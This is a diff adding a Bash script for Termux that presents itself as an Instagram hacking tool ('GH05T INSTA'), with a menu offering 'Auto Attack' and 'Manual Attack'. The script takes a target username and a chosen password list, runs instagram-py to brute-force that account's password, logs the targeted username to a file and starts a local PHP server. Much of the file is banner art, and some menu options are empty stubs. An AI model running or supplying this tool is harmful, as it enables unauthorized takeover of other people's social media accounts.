@@ -1,0 +1,193 @@
+#!/bin/bash
+function breakme () {
+if [ -d /data/data/com.termux/files/usr/cookies ]; then
+echo ""
+clear
+else
+clear
+echo " cookies not found"
+echo " please update"
+exit
+fi
+ping -c 1 google.com
+Return="$?"
+if [ "$Return" -eq "0" ]; then
+echo ""
+clear
+else
+clear
+echo ""
+echo " Please On Your Mobile Data"
+sleep 8
+clear
+fi
+}
+function banners () {
+breakme
+clear
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m | \033[0;32m  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\033[1;37m |"
+echo -e " \033[1;37m |\033[0;32m  ██╔════╝ ██║  ██║██╔═████╗██╔════╝╚══██╔══╝\033[1;37m |"
+echo -e " \033[1;37m |\033[0;32m  ██║  ███╗███████║██║██╔██║███████╗   ██║ \033[1;37m   |"
+echo -e " \033[1;37m |\033[0;32m  ██║   ██║██╔══██║████╔╝██║╚════██║   ██║ \033[1;37m   |"
+echo -e " \033[1;37m |\033[0;32m  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║ \033[1;37m   |"
+echo -e " \033[1;37m | \033[0;32m  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝ \033[1;37m   |"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m |  \033[0;32m   ██╗███╗   ██╗███████╗████████╗ █████╗  \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗  \033[1;37m |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██╔██╗ ██║███████╗   ██║   ███████║ \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║  \033[1;37m |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██║ ╚████║███████║   ██║   ██║  ██║ \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ \033[1;37m  |"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m   version\033[1;37m :\033[0;34m 0.01\033[1;37m|"
+echo -e " \033[1;37m |\033[0;31m Instagram\033[1;37m :\033[0;34m GH05T_HUNTER5   \033[0;31m   FPP    \033[1;37m :\033[0;34m 0.29\033[1;37m|"
+echo -e " \033[1;37m +----------------------------------------------+"
+}
+if [ $3 = "--pass" ]; then
+echo ""
+if [ $1 = "--user" ]; then
+clear
+if [ $4 = 1 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-1.txt"
+elif [ $4 = 2 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-2.txt"
+elif [ $4 = 3 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-3.txt"
+elif [ $4 = 4 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-4.txt"
+elif [ $4 = 5 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-5.txt"
+else
+clear
+echo " choose password option"
+exit
+fi
+banners
+cd /data/data/com.termux/files/usr/cookies
+php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+echo " User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
+instagram-py --username $2 --password-list $value
+xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+sleep 10
+exit
+else
+echo " Something Wrong"
+exit
+fi
+else
+echo ""
+clear
+fi
+if [ $3 = "--passadd" ]; then
+echo ""
+if [ $1 = "--user" ]; then
+echo ""
+cp -r $4 /data/data/com.termux/files/usr/cookies/
+clear
+banners
+cd /data/data/com.termux/files/usr/cookies
+php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+echo " User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
+instagram-py --username $2 --password-list $4
+xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+sleep 10
+exit
+else
+echo " Something Wrong"
+exit
+fi
+else
+echo ""
+clear
+fi
+if [ $1 = "--help" ]; then
+echo " Usrer Guid"
+exit
+elif [ $1 = "--update" ]; then
+echo " Update tool"
+exit
+elif [ $1 = "--error" ]; then
+echo " Error"
+exit
+elif [ $1 = "--check" ]; then
+echo " Check"
+exit
+elif [ $1 = "developer" ]; then
+echo " Developer"
+exit
+else
+echo ""
+clear
+fi
+clear
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function main-loop () {
+breakme
+clear
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m | \033[0;32m  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\033[1;37m |"
+echo -e " \033[1;37m |\033[0;32m  ██╔════╝ ██║  ██║██╔═████╗██╔════╝╚══██╔══╝\033[1;37m |"
+echo -e " \033[1;37m |\033[0;32m  ██║  ███╗███████║██║██╔██║███████╗   ██║ \033[1;37m   |"
+echo -e " \033[1;37m |\033[0;32m  ██║   ██║██╔══██║████╔╝██║╚════██║   ██║ \033[1;37m   |"
+echo -e " \033[1;37m |\033[0;32m  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║ \033[1;37m   |"
+echo -e " \033[1;37m | \033[0;32m  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝ \033[1;37m   |"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m |  \033[0;32m   ██╗███╗   ██╗███████╗████████╗ █████╗  \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗  \033[1;37m |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██╔██╗ ██║███████╗   ██║   ███████║ \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║  \033[1;37m |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██║ ╚████║███████║   ██║   ██║  ██║ \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ \033[1;37m  |"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m   version\033[1;37m :\033[0;34m 0.01\033[1;37m|"
+echo -e " \033[1;37m |\033[0;31m Instagram\033[1;37m :\033[0;34m GH05T_HUNTER5   \033[0;31m   FPP    \033[1;37m :\033[0;34m 0.29\033[1;37m|"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e "  \033[1;37m[\033[0;31m01\033[1;37m]\033[0;32m Auto Attack"
+echo -e "  \033[1;37m[\033[0;31m02\033[1;37m]\033[0;32m Manual Attack"
+echo -e "  \033[1;37m[\033[0;31m03\033[1;37m]\033[0;32m Update"
+echo -e "  \033[1;37m[\033[0;31m04\033[1;37m]\033[0;32m Error"
+echo -e "  \033[1;37m[\033[0;31m05\033[1;37m]\033[0;32m Developer"
+echo -e "  \033[1;37m[\033[0;31m99\033[1;37m]\033[0;32m Help"
+echo -e "  \033[1;37m[\033[0;31m00\033[1;37m]\033[0;32m Exit"
+read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Choose an option : \e[0m' option
+
+
+
+
+
+
+
+}
+main-loop
